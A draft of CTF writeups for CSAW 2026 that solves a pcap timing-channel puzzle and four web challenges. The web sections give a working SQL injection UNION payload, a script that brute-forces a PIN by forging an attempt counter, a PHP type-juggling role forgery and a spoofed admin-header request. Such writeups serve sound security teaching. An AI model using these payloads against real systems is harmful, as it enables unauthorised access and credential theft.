---
title: CSAW 2026 CTF writeups (additions)
tags:
  - csaw
  - ctf
  - writeup
---

<!-- DRAFT: merge these sections into csaw-2026.md. Kept in _drafts/ so hexo
     won't render it (render_drafts is false in _config.yml). -->

## Ghost in the Wire
- Category: Forensics
- Difficulty: Medium
- Topic: Covert timing channel

### Solution

We're given a single pcap and nothing else.

```
> capinfos capture.pcap
Number of packets:   504
Capture duration:    33.118515 seconds
> tshark -r capture.pcap -q -z io,phs
      udp                                    frames:504 bytes:23184
        data                                 frames:504 bytes:23184
```

504 UDP packets, all of them to port 9000, and every single payload is the same four bytes:

```
> tshark -r capture.pcap -T fields -e data.data | sort | uniq -c
    504 50494e47      # "PING"
```

So there is nothing in the payload and everything has to be in the headers. Checking which fields actually vary:

```
ip.src:      1 distinct
ip.dst:      1 distinct
udp.dstport: 1 distinct
ip.id:       1 distinct   (0x1337, cute)
ip.ttl:      2 distinct   <-- 64 and 113
udp.srcport: 121 distinct <--
```

Two TTLs splits the capture into two populations, 385 packets with `ttl=64` and 119 with `ttl=113`. Looking at the source ports of the `ttl=64` ones, they come in runs of identical values, and they're all `40000 + something small`:

```
40115 x8, 40104 x8, 40052 x8, 40100 x8, 40111 x8, 40119 x8, ...
```

`115 104 52 100 111 119` is `s h 4 d o w` in ASCII. Subtracting 40000 and grouping the runs gives `sh4dow` repeated 8 times, 48 characters, so 48 groups of 8 packets. That's our XOR key.

The `ttl=113` packets are just noise. Their source ports are uniformly spread over `50000-50999` with birthday-consistent collisions (115 distinct out of 119), which is what random looks like, not what data looks like. I wasted a bit of time running RC4/XOR over them before checking that.

So where is the actual data? Timing. Histogram the inter-packet deltas and they're clearly bimodal:

```
0.02-0.06s : ~340
0.14-0.16s : 100
```

with an empty band in between. Long gap = 1, short gap = 0, 8 gaps per group of 8 key packets = one byte, XOR with that group's key char.

The catch, and the reason a naive solve produces garbage: **the ghost packets are injected inside the long gaps.** If you threshold on `frame.time_delta` directly, one 0.15s gap gets split into two sub-threshold deltas by a ghost landing in the middle, and that bit silently flips. My first attempt gave me

```
cx!wkt1m1ng3s#g7ritl3fg|1noti2_cqg3jtWki7nncl}
```

which is obviously *almost* right (`t1m1ng` is readable, it ends in `}`) but wrong in a few places with no error to tell you so.

The fix is to drop the ghosts entirely and measure the **summed** span between consecutive key packets. What broke it open was using the known prefix: `csaw{` XOR `sh4dow` gives you exactly which bits the first five groups must produce, so you can print the required bit next to the raw timing and read the rule straight off the table.

```python
#!/usr/bin/env python3
import subprocess

raw = subprocess.run(
    ["tshark", "-r", "capture.pcap", "-T", "fields",
     "-e", "frame.time_epoch", "-e", "ip.ttl", "-e", "udp.srcport"],
    capture_output=True, text=True, check=True,
).stdout

rows = [l.split("\t") for l in raw.splitlines() if l.strip()]
ts = [float(r[0]) for r in rows]
ttl = [int(r[1]) for r in rows]
sport = [int(r[2]) for r in rows]

# key packets only; ghosts (ttl 113) are dropped entirely
keyidx = [i for i in range(len(rows)) if ttl[i] == 64]

# group consecutive key packets sharing a srcport -> one group per key char
groups = []
for i in keyidx:
    if not groups or groups[-1][0] != sport[i]:
        groups.append([sport[i], []])
    groups[-1][1].append(i)
groups = [g for g in groups if len(g[1]) == 8]

order = {i: k for k, i in enumerate(keyidx)}

out = bytearray()
for port, idx in groups:
    byte = 0
    for bit, i in enumerate(idx):
        nxt = keyidx[order[i] + 1]        # next KEY packet, skipping ghosts
        if ts[nxt] - ts[i] >= 0.10:       # summed span, not the raw delta
            byte |= 1 << (7 - bit)
    out.append(byte ^ (port - 40000))

print(out.decode())
```

```
> python3 solve.py
csaw{t1m1ng_1s_3v3ryth1ng_1n_th3_s1l3nt_ch4nn3l}
```

---

## CSALE Revenge
- Category: Web
- Difficulty: Medium
- Topic: SQLi -> homebrew crypto -> IDOR

### Solution

A Flask marketplace on SQLite, source provided. There were two instances of this running, a "beta" that got pulled and this one; more on that below because it matters.

The way in is the search box.

```python
sql = (base + (" WHERE ((l.title||' '||l.description||' '||u.username) LIKE '%"
               + query + "%')" if query else "") + " ORDER BY l.id DESC")
listings = conn.execute(sql).fetchall()
```

Straight concatenation. One thing that cost me a few minutes: the `LIKE` is wrapped in **two** parens, so the payload needs `%')` to balance, not just `%'`. Python's sqlite3 refuses stacked statements so it's `UNION SELECT` only, but the base query selects 7 columns and `title`/`description` render raw into the page, so it's a clean dump.

```
x%') UNION SELECT 9999,'ZQZ'||(<expr>)||'ZQZ','',0,NULL,'-','' --
```

```
users | password_vault | password_notes | listings | account_balances | orders | messages | app_settings
```

`password_vault` and `password_notes` are the interesting pair. Looking at `vault.py`:

```python
def xor_with_repeating_key(data, recovery_key):
    key_bytes = recovery_key.encode()
    return bytes(byte ^ key_bytes[index % len(key_bytes)]
                 for index, byte in enumerate(data))

def encrypt_password(plaintext_password, recovery_key):
    return xor_with_repeating_key(plaintext_password.encode(), recovery_key).hex()
```

Repeating-key XOR, hex encoded. And the key comes from:

```python
key = "".join(row[0] for row in
              conn.execute("SELECT key_piece FROM password_notes ORDER BY phase"))
```

which is a table in the *same database* the SQLi is reading. So dump both, reassemble the key by `phase`, XOR back, and you have everyone's cleartext password.

```
phase 1..5: 9552 4255 1620 6757 4427  ->  95524255162067574427   (20 digits)
```

```python
KEY = b"95524255162067574427"
for uid, hx in vault.items():
    ct = bytes.fromhex(hx)
    print(uid, bytes(b ^ KEY[i % len(KEY)] for i, b in enumerate(ct)).decode())
```

```
 1  superdiscreteflaguser    password123
 2  Walter_W                 I-AM_HEISENBURGGER
 7  OSIRIS                   enjoy_the_ctf_good_luck!
 9  Zuko                     i-HaVe-REgaINEd_mY_h0NOr!
10  aaa                      aaa
```

Your own account round-tripping (`aaa`/`aaa`) is a nice free confirmation that the key is right before you trust the rest.

Now, the trap. `checkout` has a real 32-bit overflow:

```python
total = signed_32(sum(x["price_cents"] * x["quantity"] for x in items))
if total > balance or balance - total < 0:
    return redirect("/cart?error=funds")
...
conn.execute("UPDATE account_balances SET balance_cents=? WHERE user_id=?",
             (balance - total, user_id))
```

Price caps at 10,000,000 (so 1e9 cents) and quantity at 25, giving 2.5e10 on a single line item, well past 2^31. Wrapped negative, both guards pass, and `balance - total` *credits* you. You need a second account to own the listing since self-purchase is blocked.

This works, and it lets you buy a listing called something like "the flag", and that listing gives you `csawctf{th1s_wAs_EZ}`.

Which is not the flag. Note the format: this instance's flag is `csaw{}`, and `csawctf{}` was the **pulled beta's** format. A flag in the other challenge's format is bait, not a near-miss, and no amount of deleting `ctf` from it will help. The source says so too if you read it: `FLAG_IMAGE_PATH` lives in `PRIVATE_LISTING_IMAGE_DIR`, and neither `listing_image` nor `checkout` ever searches that directory. No purchase can reach it, by construction.

What *can* reach it is the draft routes:

```python
@app.route("/<slug>/preview")
@login_required
def draft_preview(slug):
    draft = get_draft(slug)
    path = draft_file(draft) if draft else None
    return send_file(path) if path else abort(404)
```

No owner check. The `draft["owner_id"] == current_user_id()` test only exists on the POST branch of `/unlock`, and `draft_file()` searches `PRIVATE_LISTING_IMAGE_DIR`. So the bcrypt "seller release password" never enters the picture; the slug is the only thing protecting the image.

Drafts live in the private DB that the SQLi can't touch, so you get the slug by logging in as the owner with the password you just recovered. `superdiscreteflaguser` (the obvious bait name) has no drafts. The four that exist are on Walter_W, Zoro, OSIRIS and Zuko, and Zuko's is the one:

```
Zuko  ->  /recovered-photo-proof/preview
```

which is a picture of Zuko and Aang with the flag written across the top.

```
csaw{Th4t3_R0UgH_Bud1y}
```

---

## CSALE (the pulled beta)
- Category: Web
- Difficulty: Medium
- Topic: Client-side attempt counter

### Solution

The beta that got released by accident and then had its source removed for being inaccurate. Same cast of characters, same `password_vault` + `password_notes` XOR design (the key rotates per deploy), but a much smaller app: no cart, no orders, no messages, and `/` doesn't even require login.

Instead of drafts it has `/account/unlisted`, and the interesting ones are gated behind a 4-digit "seller-lock PIN" with a 10-attempt lockout. Except the attempt counter is a hidden form field:

```html
<input type="hidden" name="lock_state" value="eyJ2IjoxLCJ1IjoyLCJuIjowfQ">
```

```
> echo eyJ2IjoxLCJ1IjoyLCJuIjowfQ | base64 -d
{"v":1,"u":2,"n":0}
```

`n` is the attempt count and there's no signature on it. Worth actually confirming rather than assuming, so three tests:

- honest state, replaying whatever the server hands back: attempts climb 1, 2, 3, 4, 5, 6
- forged `n=0` every time, same session: pinned at 1/10 forever
- fresh session each attempt: also resets

So the counter is entirely client-authoritative and all 10,000 PINs are reachable.

```python
def state(uid, n=0):
    raw = json.dumps({"v": 1, "u": uid, "n": n}, separators=(",", ":")).encode()
    return base64.urlsafe_b64encode(raw).decode().rstrip("=")

for pin in range(10000):
    r = s.post(B + "/account/unlisted/unlock",
               data={"lock_state": state(uid, 0), "pin": f"{pin:04d}"},
               allow_redirects=False)
    if r.status_code != 403:
        print("PIN", pin); break
```

Zuko's PIN came out as `5286` (they rotate per deploy, Walter_W was `1607` on the instance before). Unlock, then grab `/account/unlisted/<id>/image`.

One thing this build *did* fix: the image endpoint has a real ownership check here, 404 for anyone but the owner. So unlike Revenge you genuinely need the vault decrypt.

Also worth flagging because it nearly cost me: `superdiscreetflaguser` has an unlisted draft called **"Flag upload proof"** containing `csawctf{Th1s_1S_4asy_r1gh1!?}`. That one is a honeypot. The image has text painted around the flag at about 5% contrast which is invisible at a glance and absent from any OCR or DOM read, because it's brush strokes, not text. Stretch the levels and it says:

```
do not submit th1ss AI flag
you will be banned
```

Since then I run every image-delivered flag through a percentile stretch on luminance *and* saturation before submitting. The real one comes back clean under the same treatment, so it actually discriminates.

```
csawctf{tH4ts_R0ugH_B4dDy}
```

---

## Juggler
- Category: Web
- Difficulty: Easy
- Topic: PHP type juggling

### Solution

PHP 8.2 + SQLite. The auth code is genuinely solid, prepared statements everywhere, `password_hash`/`password_verify`, CSRF on every handler, session regeneration on login. Don't bother there. There's also a fake SQLi in `login.php`:

```php
$cleaned = re.sub(...)  // strips everything except [A-Za-z0-9.]
$conn->execute("SELECT old_account_number FROM login_directory WHERE display_name='$cleaned'");
```

f-string interpolation, but the regex strips quotes and the result is thrown away. Dead end, deliberately.

The actual bug is two pieces. First, `profile_update.php`:

```php
foreach($jsonData as $jsonKey => $jsonValue){
    if (array_key_exists($jsonKey, $_SESSION))
        $_SESSION[$jsonKey] = $jsonValue;
```

Any key already in `$_SESSION` gets overwritten with your raw decoded value, and after login the session holds `user_id`, `username`, `role`, `csrf_token`. No allowlist, no validation, and because the input is **JSON** you control the value's *type*, not just its contents.

Second, `admin.php`:

```php
if (!isset($_SESSION["role"]) || !in_array($_SESSION["role"], $adminRoles))
```

No third argument, so that's loose `==`. And the admin roles are two random 32-char strings generated in the Dockerfile at build time, so guessing them is off the table by design.

This is the part worth getting right conceptually: loose comparison doesn't compare types, it **throws them away**. `in_array` with `==` coerces both sides to a common type and then compares *values*. On PHP 8 the classic `0 == "admin"` trick is dead (string-to-int comparison changed), but boolean comparison did not change: any non-empty string is still truthy, so

```
true == "a9f3c1..."   ->   cast string to bool  ->  true == true   ->  match
```

The string's contents are never examined. `in_array($needle, $haystack, true)` is what would have checked the type, and its absence is the whole bug.

```
POST /dashboard.php
Content-Type: application/json

{"csrf_token":"<yours>","username":"<your own>","role":true}
```

then `GET /admin.php`. Two gotchas: `Content-Type` is matched with `===` so it must be exactly `application/json`, and don't log out afterwards, because `role` is also a real DB column so the loop writes it to disk and a fresh login reloads it as a *string*, which no longer juggles.

<!-- FLAG LOST - instance is down and it wasn't saved anywhere. Either paste
     it here if you find it, or delete this comment and leave the section
     without a flag block; the chain stands on its own. -->


---

## Golf Heist
- Category: Web
- Difficulty: Easy
- Topic: Trusted proxy header

### Solution

FastAPI, no database, ~200 lines. The whole thing is a two-link chain and both links are in the source.

The prize endpoint:

```python
role = req.headers.get("X-User-Role", "")
uid  = req.headers.get("X-User-Id", "guest")
if role.lower() == "admin":
    ...  "flag": FLAG
```

read straight off the inbound request, nothing signs or strips it. The challenge names its own CVE in a hint, GHSA-7r4p-vjf4-gxv4: Caddy's `forward_auth` `copy_headers` copies headers the auth service sets but doesn't *remove* ones the client sent, so a client-supplied `X-User-Role: admin` survives to the backend. It even serves you the Caddyfile:

```
forward_auth 127.0.0.1:9091 {
    uri /auth
    copy_headers X-User-Id X-User-Role
}
```

Cute, but check the Dockerfile: it runs `uvicorn` directly on `0.0.0.0:8000` and there is **no Caddy in the image at all**. The Caddyfile is set dressing telling you which header to forge. There's no proxy to bypass, you just add the header.

The gate in front of it is a phrase derived from three Enigma-ish rotor settings picked with `secrets.randbelow(26)` at startup. Those are meant to be unguessable and they're leaked in plaintext:

```python
def hint(v): return base64.b64encode(f"{v:06d}".encode()).decode()
```

```
> curl -si localhost:8000/pro-shop/inventory/clubs | grep -i golf-hint
X-Golf-Hint: MDAwMDA3
X-Caddy-Note: Rotor I
```

Three unauthenticated GETs to `/pro-shop/inventory/{clubs,balls,bags}` and you have all three rotors, base64 being encoding and not encryption. Then `/api/enigma/encode` is an unauthenticated oracle running the same transform for arbitrary rotor values, and `/api/word-table` dumps the whole letter to word mapping. No cryptanalysis required at any point.

The one thing that will trip you up:

```python
PHRASE = [WORDS[_letters[0]][0], WORDS[_letters[1]][1], WORDS[_letters[2]][0]]
```

indices are **0, 1, 0**, the middle word is the *second* entry in its list. Also `PHRASE` is defined twice, the first one being a decoy, and the comparison lowercases and splits on whitespace so send the three words space-separated.

```
POST /api/vault/admin-item
X-User-Role: admin

{"phrase": "<three words>"}
```

```
csaw{el3gant_sw1ng_n3ver_c4ught}
```
